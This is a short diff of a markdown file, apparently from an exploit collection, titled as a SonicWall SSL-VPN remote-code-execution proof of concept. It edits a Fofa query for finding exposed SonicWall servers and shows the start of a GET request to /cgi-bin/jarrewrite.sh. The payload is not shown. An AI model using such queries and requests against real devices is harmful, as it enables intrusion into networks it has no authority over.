@@ -4,11 +4,11 @@ SonicWall-SSL-VPN-RCE
 
 ## Fofa
 ``` bash
-app="SONICWALL-SSL-VPN" && server=="SonicWALL SSL-VPN Web Server"
+server=="SonicWALL SSL-VPN Web Server"
 ```
 
 ## POC
-``` bash
+``` java
 GET /cgi-bin/jarrewrite.sh HTTP/1.1
 Host: 103.x.x.x:4433
 Connection: close
